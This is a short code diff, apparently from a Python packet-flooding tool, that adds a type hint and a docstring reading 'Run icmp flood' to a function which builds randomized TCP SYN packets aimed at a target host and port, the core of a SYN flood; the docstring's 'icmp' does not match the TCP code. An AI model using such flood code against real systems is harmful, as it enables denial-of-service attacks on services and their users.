@@ -10,7 +10,11 @@ yellow = "yellow1"
 pink = "magenta3"
 
 
-def flood(target):
+def flood(target) -> None:
+    """
+    Run icmp flood
+    """
+
     packet = IP(dst=target[0]) / TCP(
         dport=target[1], flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort()
     )
